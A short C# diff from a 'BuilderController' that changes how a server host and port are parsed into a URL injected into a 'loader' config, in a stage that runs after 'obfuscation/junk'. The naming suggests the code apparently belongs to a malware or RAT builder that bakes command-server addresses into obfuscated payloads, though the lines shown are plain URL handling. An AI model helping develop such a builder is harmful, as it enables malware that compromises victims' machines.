@@ -583,7 +583,13 @@ public class BuilderController : ControllerBase
             // Stage 4: Inject Config into Loader (MUST be last — after obfuscation/junk)
             // ══════════════════════════════════════════════════════════════
             job.Log("=== Stage 4: Injecting Config ===");
-            var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
+            var host = req.ServerHost;
+            var protocol = "http";
+            if (host.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
+                { protocol = "https"; host = host[8..]; }
+            else if (host.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
+                { host = host[7..]; }
+            var serverUrl = $"{protocol}://{host}:{req.ServerPort}";
             var injectedConfig = new InjectedConfig
             {
                 server_url = serverUrl,
